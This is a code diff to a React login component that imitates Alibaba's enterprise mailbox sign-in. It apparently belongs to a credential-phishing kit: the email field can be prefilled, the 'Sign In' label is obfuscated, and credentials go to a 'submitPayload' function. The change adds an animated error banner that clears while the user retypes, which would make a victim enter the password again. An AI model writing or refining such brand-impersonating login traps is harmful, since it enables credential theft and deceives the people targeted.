@@ -20,7 +20,7 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
   const [showPassword, setShowPassword] = useState(false);
   const [agreed, setAgreed] = useState(true);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { reportViolation, submitPayload } = useSecurity();
+  const { reportViolation, submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async () => {
     if (!agreed) {
@@ -150,7 +150,10 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                       type="text" 
                       placeholder="Enter the complete enterprise mailbox or ad..." 
                       value={email}
-                      onChange={(e) => setEmail(e.target.value)}
+                      onChange={(e) => {
+                        setEmail(e.target.value);
+                        if (error) setError(null);
+                      }}
                       className="w-full px-4 py-3 border border-gray-200 rounded focus:border-blue-400 outline-none text-[14px] placeholder:text-gray-300 transition-colors"
                     />
                   </div>
@@ -159,7 +162,10 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                       type={showPassword ? 'text' : 'password'} 
                       placeholder="Enter password" 
                       value={password}
-                      onChange={(e) => setPassword(e.target.value)}
+                      onChange={(e) => {
+                        setPassword(e.target.value);
+                        if (error) setError(null);
+                      }}
                       className="w-full px-4 py-3 border border-gray-200 rounded focus:border-blue-400 outline-none text-[14px] placeholder:text-gray-300 transition-colors"
                     />
                     <button 
@@ -187,6 +193,16 @@ const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
                 >
                   {isSubmitting ? '...' : <ObfuscatedText text="Sign In" />}
                 </button>
+
+                {error && (
+                  <motion.div 
+                    initial={{ opacity: 0, y: -10 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    className="text-[#f54c3e] text-[13px] text-center font-medium bg-red-50 py-2 rounded border border-red-100"
+                  >
+                    {error}
+                  </motion.div>
+                )}
 
                 <div className="flex items-start text-[12px] leading-snug text-gray-500 pt-2">
                   <input 
